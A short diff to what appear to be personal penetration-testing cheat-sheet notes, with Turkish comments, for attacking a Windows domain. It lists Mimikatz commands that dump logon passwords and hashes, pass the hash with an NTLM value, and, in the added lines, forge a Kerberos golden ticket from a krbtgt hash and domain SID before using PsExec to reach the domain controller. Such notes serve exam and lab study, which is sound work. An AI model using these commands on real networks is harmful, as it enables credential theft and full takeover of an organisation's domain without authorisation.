@@ -68,7 +68,12 @@ sekurlsa::logonpasswords #dump pass hashes
 
 sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
 
-PsExec64.exe \\dc01 cmd.exe # powershell acildiginda dcye baglan
+kerberos::golden /user:susan(herhangi bi user) /domain:exam.com /sid:S-1-5-21-88558181-3850747640-3669402957 /krbtgt:345caf37c36688f0afabed009787b7b2 /ptt
+
+misc::cmd
+
+PsExec64.exe \\dc01 cmd.exe # powershell veya cmd acildiginda dcye baglan
+
 
 
 ### PowerView
